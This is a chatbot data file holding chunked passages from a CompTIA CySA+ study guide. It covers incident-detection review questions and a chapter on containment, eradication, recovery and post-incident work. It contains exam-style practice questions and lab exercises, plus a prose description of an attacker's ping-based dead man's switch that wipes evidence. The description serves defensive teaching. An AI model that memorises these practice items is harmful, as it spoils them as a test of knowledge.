rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	compromised 11. While monitoring network traffic to his web server cluster, Mark notices a significant increase in traffic. He checks the source addresses for inbound traffic and finds that the traffic is coming from many different systems all over the world. What should Mark identify this as if he believes that it may be an attack? A. A denial-­of-­service attack B. A distributed network scan Review Questions C. A DNS-­based attack D. A distributed denial-­of-­service attack 395 12. Valentine wants to check for unauthorized access to a system. What two log types are most likely to contain this information? A. Authentication logs and user creation logs B. System logs and application logs C. Authentication logs and application logs D. System logs and authentication logs 13. Sayed notices that a remote system has attempted to log into a system he is responsible for multiple times using the same administrator’s user ID but different passwords. What has Sayed most likely discovered? A. A user who forgot their password B. A broken application C. A brute-­force attack D. A misconfigured service 14. While Susan is monitoring a router via network flows, she sees a sudden drop in network traffic levels to zero, and the traffic chart shows a flat line. What has likely happened? A. The sampling rate is set incorrectly. B. The router is using SNMP. C. The monitored link failed. D. A DDoS attack is occurring. 15. Leo wants to monitor his application for common issues. Which of the following is not a typical method of monitoring for application issues? A. Up/down logging B. System logging C. Performance logging D. Transactional logging 16. Greg notices that a user account on a Linux server he is responsible for has connected to 10 machines via SSH within seconds. What type of IoC best matches this type of behavior? A. Bot-­like behavior B. Port scanning C. Denial of service D. Escalation of privileges Chapter 10 396 ■ Incident Detection and Analysis 17. Arun wants to monitor for unusual database usage. Which of the following is most likely to be indicative of a malicious actor? A. Increases in cached hits to the database B. Decreases in network traffic to the database C. Increases in disk reads for the database D. Decreases in database size 18. Valerie is concerned that an attacker may have gained access to a system in her datacenter. Which of the following behaviors is not a common network-­based IoC that she should monitor for? A. Traffic to unexpected destinations B. Unusual volumes of outbound traffic C. Increases in system memory consumption D. Outbound traffic at unusual times 19. Alex has noticed that the primary disk for his Windows server is quickly filling up. What should he do to determine what is filling up the drive? A. Check the filesystem logs. B. Check the security logs. C. Search for large files and directories. D. Search for file changes. 20. Joseph wants to be notified if user behaviors vary from normal on systems he
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	behaviors is not a common network-­based IoC that she should monitor for? A. Traffic to unexpected destinations B. Unusual volumes of outbound traffic C. Increases in system memory consumption D. Outbound traffic at unusual times 19. Alex has noticed that the primary disk for his Windows server is quickly filling up. What should he do to determine what is filling up the drive? A. Check the filesystem logs. B. Check the security logs. C. Search for large files and directories. D. Search for file changes. 20. Joseph wants to be notified if user behaviors vary from normal on systems he maintains. He uses a tool to capture and analyze a week of user behavior and uses that to determine if unusual behavior occurs. What is this practice called? A. Pattern matching B. Baselining C. Fingerprinting D. User modeling Chapter 11 Containment, Eradication, and Recovery THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 3.0: Incident Response and Management ■■ 3.2: Given a scenario, perform incident response activities ■■ Containment, eradication, and recovery Chapter 9, “Building an Incident Response Program,” provided an overview of the steps required to build and implement a cybersecurity incident response program according to the process advocated by the National Institute of Standards and Technology (NIST). In their Computer Security Incident Handling Guide, NIST outlines the four-­phase incident response process shown in Figure 11.1. F I G U R E 11. 1 Incident response process Preparation Detection & Analysis Containment Eradication & Recovery Post-Incident Activity Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. The remainder of Chapter 9 provided an overview of the Preparation and Post-­Incident Activity phases of incident response. Chapter 10, “Incident Detection and Analysis,” covered the details behind the Detection and Analysis phase, including sources of cybersecurity information. This chapter examines the Containment, Eradication, and Recovery phase of incident response. Containing the Damage The Containment, Eradication, and Recovery phase of incident response moves the organization from the primarily passive incident response activities that take place during the Detection and Analysis phase to more active undertakings. Once the organization understands Containing the Damage 399 that a cybersecurity incident is underway, it takes actions designed to minimize the damage caused by the incident and restore normal operations as quickly as possible. Containment is the first activity that takes place during this phase, and it should begin as quickly as possible after analysts determine that an incident is underway. Containment activities are designed to limit the scope and impact of the incident. The scope of the incident is the number of systems or individuals involved—­you can think of containment as putting a fence around the existing incident and preventing it from spreading elsewhere. The impact of the incident is the effect that it has on the organization. By containing the incident, you limit the magnitude of that incident’s impact. Containment means very different things in the context of different types of security incidents.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and it should begin as quickly as possible after analysts determine that an incident is underway. Containment activities are designed to limit the scope and impact of the incident. The scope of the incident is the number of systems or individuals involved—­you can think of containment as putting a fence around the existing incident and preventing it from spreading elsewhere. The impact of the incident is the effect that it has on the organization. By containing the incident, you limit the magnitude of that incident’s impact. Containment means very different things in the context of different types of security incidents. For example, if the organization is experiencing active exfiltration of data from a credit card processing system, incident responders might contain the damage by disconnecting that system from the network, preventing the attackers from continuing to exfiltrate information. On the other hand, if the organization is experiencing a denial-­of-­service attack against its website, disconnecting the network connection would simply help the attacker achieve its objective. In that case, containment might include placing filters on an upstream Internet connection that blocks all inbound traffic from networks involved in the attack or blocks web requests that bear a certain signature. Exam Note When you take the exam, remember that containment is a critical priority. You want to stop the spread of any potential security threats before you worry about eradicating the damage or recovering data. Containment activities typically aren’t perfect and often cause some collateral damage that disrupts normal business activity. Consider the two examples described in the previous paragraph. Disconnecting a credit card processing system from the network may bring transactions to a halt, causing potentially significant losses of business. Similarly, blocking large swaths of inbound web traffic may render the site inaccessible to some legitimate users. Incident responders undertaking containment strategies must understand the potential side effects of their actions while weighing them against the greater benefit to the organization. Containment Strategy Criteria Selecting appropriate containment strategies is one of the most difficult tasks facing incident responders. Containment approaches that are too drastic may have an unacceptable impact on business operations. On the other hand, responders who select weak containment approaches may find that the incident escalates to cause even more damage. Chapter 11 400 ■ Containment, Eradication, and Recovery (continued) In the Computer Security Incident Handling Guide, NIST recommends using the following criteria to develop an appropriate containment strategy and weigh it against business interests: ■■ Potential damage to and theft of resources ■■ Need for evidence preservation ■■ Service availability (e.g., network connectivity, services provided to external parties) ■■ Time and resources needed to implement the strategy ■■ Effectiveness of the strategy (e.g., partial containment, full containment) ■■ Duration of the solution (e.g., emergency workaround to be removed in four hours, temporary workaround to be removed in two weeks, permanent solution) Unfortunately, there’s no formula or decision tree that guarantees responders will make the “right” decision while responding to an incident. Incident responders should understand these criteria, the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and weigh it against business interests: ■■ Potential damage to and theft of resources ■■ Need for evidence preservation ■■ Service availability (e.g., network connectivity, services provided to external parties) ■■ Time and resources needed to implement the strategy ■■ Effectiveness of the strategy (e.g., partial containment, full containment) ■■ Duration of the solution (e.g., emergency workaround to be removed in four hours, temporary workaround to be removed in two weeks, permanent solution) Unfortunately, there’s no formula or decision tree that guarantees responders will make the “right” decision while responding to an incident. Incident responders should understand these criteria, the intent of management, and their technical and business operating environment. Armed with this information, responders will be well positioned to follow their best judgment and select an appropriate containment strategy. Segmentation As you learned in Chapter 1, “Today’s Cybersecurity Analyst,” cybersecurity analysts often use network segmentation as a proactive strategy to prevent the spread of future security incidents. For example, the network shown in Figure 11.2 is designed to segment different types of users from each other and from critical systems. An attacker who is able to gain access to the guest network would not be able to interact with systems belonging to employees or in the datacenter without traversing the network firewall. Network segmentation is used as a proactive control in a defense-­in-­depth approach to information security. In addition to being used as a proactive control, network segmentation may play a crucial role in incident response. During the early stages of an incident, responders may realize that a portion of systems are compromised but wish to continue to observe the activity on those systems while they determine other appropriate responses. However, they certainly want to protect other systems on the network from those potentially compromised systems. Figure 11.3 shows an example of how an organization might apply network segmentation during an incident response effort. Cybersecurity analysts suspect that several systems in the datacenter were compromised and built a separate virtual LAN (VLAN) to contain those systems. That VLAN, called the quarantine network, is segmented from the rest of the datacenter network and controlled by very strict firewall rules. Putting the systems on this network segment provides some degree of isolation, preventing them from damaging systems on other segments but allowing continued live analysis efforts. Containing the Damage F I G U R E 11. 2 Proactive network segmentation Guest Network Employee Network Firewall Internet Datacenter Network F I G U R E 11. 3 Network segmentation for incident response Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network 401 402 Chapter 11 ■ Containment, Eradication, and Recovery Isolation Although segmentation does limit the access that attackers have to the remainder of the network, it sometimes doesn’t go far enough to meet containment objectives. Cybersecurity analysts may instead decide that it is necessary to use stronger isolation practices to cut off an attack. Two primary isolation techniques may be used during a cybersecurity incident response effort: isolating affected systems
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Network Employee Network Firewall Internet Datacenter Network F I G U R E 11. 3 Network segmentation for incident response Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network 401 402 Chapter 11 ■ Containment, Eradication, and Recovery Isolation Although segmentation does limit the access that attackers have to the remainder of the network, it sometimes doesn’t go far enough to meet containment objectives. Cybersecurity analysts may instead decide that it is necessary to use stronger isolation practices to cut off an attack. Two primary isolation techniques may be used during a cybersecurity incident response effort: isolating affected systems and isolating the attacker. Segmentation and isolation strategies carry with them significant risks to the organization. First, the attacker retains access to the compromised system, creating the potential for further expansion of the security incident. Second, the compromised system may be used to attack other systems on the Internet. In the best case, an attack launched from the organization’s network against a third party may lead to some difficult conversations with cybersecurity colleagues at other firms. In the worst case, the courts may hold the organization liable for knowingly allowing the use of their network in an attack. Cybersecurity analysts considering a segmentation or isolation approach to containment should consult with both management and legal counsel. Isolating Affected Systems Isolating affected systems is, quite simply, taking segmentation to the next level. Affected systems are completely disconnected from the remainder of the network, although they may still be able to communicate with each other and the attacker over the Internet. Figure 11.4 shows an example of taking the quarantine VLAN from the segmentation strategy and converting it to an isolation approach. Notice that the only difference between Figure 11.3 and Figure 11.4 is where the quarantine network is connected. In the segmentation approach, the network is connected to the firewall and may have some limited access to other networked systems. In the isolation approach, the quarantine network connects directly to the Internet and has no access to other systems. In reality, this approach may be implemented by simply altering firewall rules rather than bypassing the firewall entirely. The objective is to continue to allow the attacker to access the isolated systems but restrict their ability to access other systems and cause further damage. This technique is also used outside the world of incident response to physically and logically isolate extremely sensitive systems from other networks. When using that approach, the isolated system is commonly referred to as an airgapped system. Containing the Damage F I G U R E 11. 4 403 Network isolation for incident response Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network Isolating the Attacker Isolating the attacker is an interesting variation on the isolation strategy and depends on the use of sandbox systems that are set up purely to monitor attacker activity and that do not contain any information or resources of value to the attacker. Placing attackers in a sandboxed environment allows continued observation
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	systems from other networks. When using that approach, the isolated system is commonly referred to as an airgapped system. Containing the Damage F I G U R E 11. 4 403 Network isolation for incident response Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network Isolating the Attacker Isolating the attacker is an interesting variation on the isolation strategy and depends on the use of sandbox systems that are set up purely to monitor attacker activity and that do not contain any information or resources of value to the attacker. Placing attackers in a sandboxed environment allows continued observation in a fairly safe, contained environment. Some organizations use honeypot systems for this purpose. For more information on honeypots, see Chapter 1. Removal Removal of compromised systems from the network is the strongest containment technique in the cybersecurity analyst’s incident response toolkit. As shown in Figure 11.5, removal differs from segmentation and isolation in that the affected systems are completely disconnected from other networks, although they may still be allowed to communicate with other compromised systems within the quarantine VLAN. In some cases, each suspect system may be physically disconnected from the network so that they are prevented from communicating 404 Chapter 11 ■ Containment, Eradication, and Recovery even with each other. The exact details of removal will depend on the circumstances of the incident and the professional judgment of incident responders. F I G U R E 11. 5 Network removal for incident response Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network Removal Isn’t Foolproof Removing a system from the network is a common containment step designed to prevent further damage from taking place, but NIST points out in their Computer Security Incident Handling Guide that it isn’t foolproof. They present a hypothetical example of an attacker using a simple ping as a sort of “dead man’s switch” for a compromised system, designed to identify when the adversary detects the attack and removes the system from the network. In this scenario, the attacker simply sets up a periodic ping request to a known external host, such as the Google public DNS server located at 8.8.8.8. This server is almost always accessible from any network, and the attacker can verify this connectivity after initially compromising a system. The attacker can then write a simple script that monitors the results of those ping requests and, after detecting several consecutive failures, assumes that the attack was detected and Containing the Damage 405 the system was removed from the network. The script can then wipe out evidence of the attack or encrypt important information stored on the server. The moral of the story is that although removal is a strong weapon in the containment toolkit, it isn’t foolproof! Evidence Acquisition and Handling The primary objective during the containment phase of incident response is to limit the damage to the organization and its resources. Although that objective may take precedence over other goals, responders may still be interested in gathering evidence during
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	failures, assumes that the attack was detected and Containing the Damage 405 the system was removed from the network. The script can then wipe out evidence of the attack or encrypt important information stored on the server. The moral of the story is that although removal is a strong weapon in the containment toolkit, it isn’t foolproof! Evidence Acquisition and Handling The primary objective during the containment phase of incident response is to limit the damage to the organization and its resources. Although that objective may take precedence over other goals, responders may still be interested in gathering evidence during the containment process. This evidence can be crucial in the continuing analysis of the incident for internal purposes, or it can be used during legal proceedings against the attacker. Chapter 13, “Performing Forensic Analysis and Techniques for Incident Response,” will provide a thorough review of the forensic strategies that might be used during an incident investigation. Chapter 1 also included information on reverse engineering practices that may be helpful during an incident investigation. If incident handlers suspect that evidence gathered during an investigation may be used in court, they should take special care to preserve and document evidence during the course of their investigation. NIST recommends that investigators maintain a detailed evidence log that includes the following: ■■ ■■ Identifying information (for example, the location, serial number, model number, hostname, MAC addresses, and IP addresses of a computer) Name, title, and phone number of each individual who collected or handled the evidence during the investigation ■■ Time and date (including time zone) of each occurrence of evidence handling ■■ Locations where the evidence was stored Failure to maintain accurate logs will bring the evidence chain-­of-­custody into question and may cause the evidence to be inadmissible in court. Identifying Attackers Identifying the perpetrators of a cybersecurity incident is a complex task that often leads investigators down a winding path of redirected hosts that crosses international borders. Although you might find IP address records stored in your logs, it is incredibly unlikely that they correspond to the actual IP address of the attacker. Any attacker other than the most rank of amateurs will relay their communications through a series of compromised systems, making it difficult to trace their actual origin. Before heading down this path of investigating an attack’s origin, it’s important to ask yourself why you are pursuing it. Is there really business value in uncovering who attacked 406 Chapter 11 ■ Containment, Eradication, and Recovery you, or would your time be better spent on containment, eradication, and recovery activities? The NIST Computer Security Incident Handling Guide addresses this issue head on, giving the opinion that “Identifying an attacking host can be a time-­consuming and futile process that can prevent a team from achieving its primary goal—­minimizing the business impact.” Law enforcement officials may approach this situation with objectives that differ from those of the attacked organization’s cybersecurity analysts. After all, one of the core responsibilities of law enforcement organizations is
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	really business value in uncovering who attacked 406 Chapter 11 ■ Containment, Eradication, and Recovery you, or would your time be better spent on containment, eradication, and recovery activities? The NIST Computer Security Incident Handling Guide addresses this issue head on, giving the opinion that “Identifying an attacking host can be a time-­consuming and futile process that can prevent a team from achieving its primary goal—­minimizing the business impact.” Law enforcement officials may approach this situation with objectives that differ from those of the attacked organization’s cybersecurity analysts. After all, one of the core responsibilities of law enforcement organizations is to identify criminals, arrest them, and bring them to trial. That responsibility may conflict with the core cybersecurity objectives of containment, eradication, and recovery. Cybersecurity and business leaders should take this conflict into consideration when deciding whether to involve law enforcement agencies in an incident investigation and the degree of cooperation they will provide to an investigation that is already underway. See Chapter 4, “Threat Intelligence,” for more information on identifying threat actors. Law enforcement officers have tools at their disposal that aren’t available to private cybersecurity analysts. If you do have a pressing need to identify an attacker, it may be wise to involve law enforcement. They have the ability to obtain search warrants that may prove invaluable during an investigation. Officers can serve search warrants on Internet service providers and other companies that may have log records that assist in untangling the winding trail of an attack. Additionally, law enforcement agencies may have access to sensitive government databases that contain information on known attackers and their methodologies. Incident Eradication and Recovery Once the cybersecurity team successfully contains an incident, it is time to move on to the eradication phase of the response. The primary purpose of eradication is to remove any of the artifacts of the incident that may remain on the organization’s network. This could include the removal of any malicious code from the network, the sanitization of compromised media, and the securing of compromised user accounts. The recovery phase of incident response focuses on restoring normal capabilities and services. It includes reconstituting resources and correcting security control deficiencies that may have led to the attack. This could include rebuilding and patching systems, reconfiguring firewalls, updating malware signatures, and similar activities. The goal of recovery is not just to rebuild the organization’s network but also to do so in a manner that reduces the likelihood of a successful future attack. During the eradication and recovery effort, cybersecurity analysts should develop a clear understanding of the incident’s root cause. This is critical to implementing a secure recovery that corrects control deficiencies that led to the original attack. After all, if you don’t understand how an attacker breached your security controls in the first place, it will be hard to Incident Eradication and Recovery 407 correct those controls so that the attack doesn’t reoccur! Understanding the root cause of an attack is a completely different activity than identifying the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	so in a manner that reduces the likelihood of a successful future attack. During the eradication and recovery effort, cybersecurity analysts should develop a clear understanding of the incident’s root cause. This is critical to implementing a secure recovery that corrects control deficiencies that led to the original attack. After all, if you don’t understand how an attacker breached your security controls in the first place, it will be hard to Incident Eradication and Recovery 407 correct those controls so that the attack doesn’t reoccur! Understanding the root cause of an attack is a completely different activity than identifying the attacker. This process is also known as implementing compensating controls because those controls compensate for the original security deficiency. Root cause assessment is a critical component of incident recovery whereas, as mentioned earlier, identifying the attacker can be a costly distraction. More coverage of compensating controls appears in Chapter 8, “Responding to Vulnerabilities.” Root cause analysis also helps an organization identify other systems they operate that might share the same vulnerability. For example, if an attacker compromises a Cisco router and root cause analysis reveals an error in that device’s configuration, administrators may correct the error on other routers they control to prevent a similar attack from compromising those devices. Remediation and Reimaging During an incident, attackers may compromise one or more systems through the use of malware, web application attacks, or other exploits. Once an attacker gains control of a system, security professionals should consider it completely compromised and untrustworthy. It is not safe to simply correct the security issue and move on because the attacker may still have an undetected foothold on the compromised system. Instead, the system should be rebuilt, either from scratch or by using an image or backup of the system from a known secure state. Rebuilding and/or restoring systems should always be done with the incident root cause analysis in mind. If the system was compromised because it contained a security vulnerability, as opposed to through the use of a compromised user account, backups and images of that system likely have that same vulnerability. Even rebuilding the system from scratch may reintroduce the earlier vulnerability, rendering the system susceptible to the same attack. During the recovery phase, administrators should ensure that rebuilt or restored systems are remediated to address known security issues. Remediation activities may also require broader improvements to the organization’s cybersecurity controls. You may need to correct firewall rules, add additional security technologies, or implement other corrective actions to remediate deficiencies. Patching Systems and Applications During the incident recovery effort, cybersecurity analysts will patch operating systems and applications involved in the attack. This is also a good time to review the security patch status of all systems in the enterprise, addressing other security issues that may lurk behind the scenes. Cybersecurity analysts should first focus their efforts on systems that were directly involved in the compromise and then work their way outward, addressing systems that were indirectly related to the compromise before
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	You may need to correct firewall rules, add additional security technologies, or implement other corrective actions to remediate deficiencies. Patching Systems and Applications During the incident recovery effort, cybersecurity analysts will patch operating systems and applications involved in the attack. This is also a good time to review the security patch status of all systems in the enterprise, addressing other security issues that may lurk behind the scenes. Cybersecurity analysts should first focus their efforts on systems that were directly involved in the compromise and then work their way outward, addressing systems that were indirectly related to the compromise before touching systems that were not involved at all. 408 Chapter 11 ■ Containment, Eradication, and Recovery Figure 11.6 shows the phased approach that cybersecurity analysts should take to patching systems and applications during the recovery phase. F I G U R E 11. 6 Patching priorities Systems directly involved in the compromise Systems ancillary to the compromise Other systems Sanitization and Secure Disposal During the recovery effort, cybersecurity analysts may need to dispose of or repurpose media from systems that were compromised during the incident. In those cases, special care should be taken to ensure that sensitive information that was stored on that media is not compromised. Responders don’t want the recovery effort from one incident to lead to a second incident! Generally speaking, three options are available for the secure disposition of media containing sensitive information: clear, purge, and destroy. NIST defines these three activities clearing in NIST SP 800-­88: Guidelines for Media Sanitization: ■■ ■■ Clear applies logical techniques to sanitize data in all user-­addressable storage locations for protection against simple noninvasive data recovery techniques; this is typically applied through the standard Read and Write commands to the storage device, such as by rewriting with a new value or using a menu option to reset the device to the factory state (where rewriting is not supported). Purge applies physical or logical techniques that render target data recovery infeasible using state-­of-­the-­art laboratory techniques. Examples of purging activities include overwriting, block erase, and cryptographic erase activities when performed through the use of dedicated, standardized device commands. Degaussing is another form of purging that uses extremely strong magnetic fields to disrupt the data stored on a device. Incident Eradication and Recovery ■■ 409 Destroy renders target data recovery infeasible using state-­of-­the-­art laboratory techniques and results in the subsequent inability to use the media for storage of data. Destruction techniques include disintegration, pulverization, melting, and incinerating. These three levels of data disposal are listed in increasing order of effectiveness as well as difficulty and cost. Physically incinerating a hard drive, for example, removes any possibility that data will be recovered but requires the use of an incinerator and renders the drive unusable for future purposes. Figure 11.7 shows a flowchart designed to help security decision-makers choose appropriate techniques for destroying information and can be used to guide incident recovery efforts. Notice that the flowchart includes a Validation phase after efforts to clear,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the media for storage of data. Destruction techniques include disintegration, pulverization, melting, and incinerating. These three levels of data disposal are listed in increasing order of effectiveness as well as difficulty and cost. Physically incinerating a hard drive, for example, removes any possibility that data will be recovered but requires the use of an incinerator and renders the drive unusable for future purposes. Figure 11.7 shows a flowchart designed to help security decision-makers choose appropriate techniques for destroying information and can be used to guide incident recovery efforts. Notice that the flowchart includes a Validation phase after efforts to clear, purge, or destroy data. Validation ensures that the media sanitization was successful and that remnant data does not exist on the sanitized media. F I G U R E 11. 7 Security Categorization Low Sanitization and disposition decision flow Leaving Org Control? No Yes Purge No Reuse Media? Validate Clear Destroy Security Categorization Moderate Clear Document No Yes Leaving Org Control? Exit Yes Purge No Security Categorization High Reuse Media? Yes Leaving Org Control? Yes Destroy No Source: NIST SP 800-61: Computer Security Incident Handling Guide https://nvlpubs.nist.gov/nistpubs/ specialpublications/nist.sp.800-61r2.pdf / last accessed February 15, 2023. 410 Chapter 11 ■ Containment, Eradication, and Recovery Validating Data Integrity Before concluding the recovery effort, incident responders should take time to verify that the recovery measures put in place were successful. The exact nature of this verification will depend on the technical circumstances of the incident and the organization’s infrastructure. Four activities that should always be included in these validation efforts follow: Validate that only authorized user accounts exist on every system and application in the organization. In many cases, organizations already undertake periodic account reviews that verify the authorization for every account. This process should be used during the recovery validation effort. Verify the proper restoration of permissions assigned to each account. During the account review, responders should also verify that accounts do not have extraneous permissions that violate the principle of least privilege. This is true for normal user accounts, administrator accounts, and service accounts. Verify the integrity of systems and data. Confirm that systems involved in the incident are properly configured to meet security standards and that no unauthorized changes have been made to settings or data. You may need to restore systems from backups taken prior to the incident. Verify that all systems are logging properly. Every system and application should be configured to log security-­related information to a level that is consistent with the organization’s logging policy. Those log records should be sent to a centralized log repository that preserves them for archival use. The validation phase should include verification that these logs are properly configured and received by the repository. Conduct vulnerability scans on all systems. Vulnerability scans play an important role in verifying that systems are safeguarded against future attacks. Analysts should run thorough scans against systems and initiate remediation workflows where necessary. For more information on this process, see Chapter 6, “Designing a Vulnerability Management Program,” and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	be configured to log security-­related information to a level that is consistent with the organization’s logging policy. Those log records should be sent to a centralized log repository that preserves them for archival use. The validation phase should include verification that these logs are properly configured and received by the repository. Conduct vulnerability scans on all systems. Vulnerability scans play an important role in verifying that systems are safeguarded against future attacks. Analysts should run thorough scans against systems and initiate remediation workflows where necessary. For more information on this process, see Chapter 6, “Designing a Vulnerability Management Program,” and Chapter 7, “Analyzing Vulnerability Scans.” These actions form the core of an incident recovery validation effort and should be complemented with other activities that validate the specific controls put in place during the Containment, Eradication, and Recovery phase of incident response. Wrapping Up the Response After the immediate, urgent actions of containment, eradication, and recovery are complete, it is very tempting for the CSIRT to take a deep breath and consider their work done. While the team should take a well-­deserved break, the incident response process is not complete until the team completes post-­incident activities that include managing change control processes, conducting a lessons learned session, and creating a formal written incident report. Wrapping Up the Response 411 Managing Change Control Processes During the containment, eradication, and recovery process, responders may have bypassed the organization’s normal change control and configuration management processes in an effort to respond to the incident in an expedient manner. These processes provide important management controls and documentation of the organization’s technical infrastructure. Once the urgency of response efforts pass, the responders should turn back to these processes and use them to document any emergency changes made during the incident response effort. Conducting a Lessons Learned Session At the conclusion of every cybersecurity incident, everyone involved in the response should participate in a formal lessons learned session that is designed to uncover critical information about the response. This session also highlights potential deficiencies in the incident response plan and procedures. For more information on conducting the post-­incident lessons learned session, see the “Lessons Learned Review” section in Chapter 9. During the lessons learned session, the organization may uncover potential changes to the incident response plan. In those cases, the leader should propose those changes and move them through the organization’s formal change process to improve future incident response efforts. During an incident investigation, the team may encounter new indicators of compromise (IOCs) based on the tools, techniques, and tactics used by attackers. As part of the lessons learned review, the team should clearly identify any new IOC and make recommendations for updating the organization’s security monitoring program to include those IOCs. This will reduce the likelihood of a similar incident escaping attention in the future. You’ll find full coverage of IOCs in Chapter 4. Exam Tip Indicators of compromise (IOCs) are collected pieces of digital forensic evidence that identify a security breach such as an intrusion
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	incident response efforts. During an incident investigation, the team may encounter new indicators of compromise (IOCs) based on the tools, techniques, and tactics used by attackers. As part of the lessons learned review, the team should clearly identify any new IOC and make recommendations for updating the organization’s security monitoring program to include those IOCs. This will reduce the likelihood of a similar incident escaping attention in the future. You’ll find full coverage of IOCs in Chapter 4. Exam Tip Indicators of compromise (IOCs) are collected pieces of digital forensic evidence that identify a security breach such as an intrusion has occurred. Examples may include IP addresses, hash values, anomalies in network traffic, or privileged user account activity. Developing a Final Report Every incident that activates the CSIRT should conclude with a formal written report that documents the incident for posterity. This serves several important purposes. First, it creates an institutional memory of the incident that is useful when developing new security controls and training new security team members. Second, it may serve as an important record of the incident if there is legal action that results from the incident. Finally, the act of creating the 412 Chapter 11 ■ Containment, Eradication, and Recovery written report can help identify previously undetected deficiencies in the incident response process that may feed back through the lessons learned process. Important elements that the CSIRT should cover in a post-­incident report include the following: ■■ Chronology of events for the incident and response efforts ■■ Root cause of the incident ■■ Location and description of evidence collected during the incident response process ■■ Specific actions taken by responders to contain, eradicate, and recover from the incident, including the rationale for those decisions ■■ Estimates of the impact of the incident on the organization and its stakeholders ■■ Results of post-­recovery validation efforts ■■ Documentation of issues identified during the lessons learned review Incident summary reports should be classified in accordance with the organization’s classification policy and stored in an appropriately secured manner. The organization should also have a defined retention period for incident reports and destroy old reports when they exceed that period. Evidence Retention At the conclusion of an incident, the team should make a formal determination about the disposition of evidence collected during the incident. If the evidence is no longer required, then it should be destroyed in accordance with the organization’s data disposal procedures. If the evidence will be preserved for future use, it should be placed in a secure evidence repository with the chain of custody maintained. The decision to retain evidence depends on several factors, including whether the incident is likely to result in criminal or civil action and the impact of the incident on the organization. This topic should be directly addressed in an organization’s incident response procedures. Summary After identifying a security incident in progress, CSIRT members should move immediately into the containment, eradication, and recovery phase of incident response. The first priority of this phase is
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	data disposal procedures. If the evidence will be preserved for future use, it should be placed in a secure evidence repository with the chain of custody maintained. The decision to retain evidence depends on several factors, including whether the incident is likely to result in criminal or civil action and the impact of the incident on the organization. This topic should be directly addressed in an organization’s incident response procedures. Summary After identifying a security incident in progress, CSIRT members should move immediately into the containment, eradication, and recovery phase of incident response. The first priority of this phase is to contain the damage caused by a security incident to lower the impact on the organization. Once an incident is contained, responders should take actions to eradicate the effects of the incident and recover normal operations. Once the immediate Exam Essentials 413 response efforts are complete, the CSIRT should move into the post-­incident phase, conduct a lessons learned session, and create a written report summarizing the incident response process. Exam Essentials Explain the purpose of containment activities. After identifying a potential incident in progress, responders should take immediate action to contain the damage. They should select appropriate containment strategies based on the nature of the incident and impact on the organization. Potential containment activities include network segmentation, isolation, and removal of affected systems. Know the importance of collecting evidence during a response. Much of the evidence of a cybersecurity incident is volatile in nature and may not be available later if not collected during the response. CSIRT members must determine the priority that evidence collection will take during the containment, eradication, and recovery phase and then ensure that they properly handle any collected evidence that can later be used in legal proceedings, including properly preserving evidence, documenting the chain of custody, and validating data integrity. Explain how identifying attackers can be a waste of valuable resources. Most efforts to identify the perpetrators of security incidents are futile, consuming significant resources before winding up at a dead end. The primary focus of incident responders should be on protecting the business interests of the organization. Law enforcement officials have different priorities, and responders should be aware of potentially conflicting objectives. Explain the purpose of eradication and recovery. After containing the damage, responders should move on to eradication and recovery activities that seek to remove all traces of an incident from the organization’s network and restore normal operations as quickly as possible. This should include validation efforts that verify security controls are properly implemented before closing the incident. Define the purpose of post-­incident activities. At the conclusion of a cybersecurity incident response effort, CSIRT members should conduct a formal lessons learned session that reviews the entire incident response process and recommends changes to the organization’s incident response plan, as needed. Any such changes should be made through the organization’s change control process. The team should also complete a formal incident summary report that serves to document the incident for posterity. Other considerations during
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	network and restore normal operations as quickly as possible. This should include validation efforts that verify security controls are properly implemented before closing the incident. Define the purpose of post-­incident activities. At the conclusion of a cybersecurity incident response effort, CSIRT members should conduct a formal lessons learned session that reviews the entire incident response process and recommends changes to the organization’s incident response plan, as needed. Any such changes should be made through the organization’s change control process. The team should also complete a formal incident summary report that serves to document the incident for posterity. Other considerations during this process include evidence retention, indicator of compromise (IoC) generation, and ongoing monitoring. 414 Chapter 11 ■ Containment, Eradication, and Recovery Lab Exercises Activity 11.1: Incident Containment Options Label each one of the following figures with the type of incident containment activity pictured. Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network ____________________________________________________________________________ Lab Exercises 415 Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network ____________________________________________________________________________ Guest Network Employee Network Internet Firewall Datacenter Network Quarantine Network ____________________________________________________________________________ Chapter 11 416 ■ Containment, Eradication, and Recovery Activity 11.2: Sanitization and Disposal Techniques Fill in the flowchart with the appropriate dispositions for information being destroyed following a security incident. Each box should be completed using one of the following three words: Clear Purge Destroy Security Categorization Low Leaving Org Control? No Yes Validate No Security Categorization Moderate Reuse Media? No Yes Leaving Org Control? Exit Yes No Security Categorization High Reuse Media? No Document Yes Leaving Org Control? Yes Review Questions 417 Review Questions 1. 2. 3. 4. 5. Which one of the phases of incident response involves primarily active undertakings 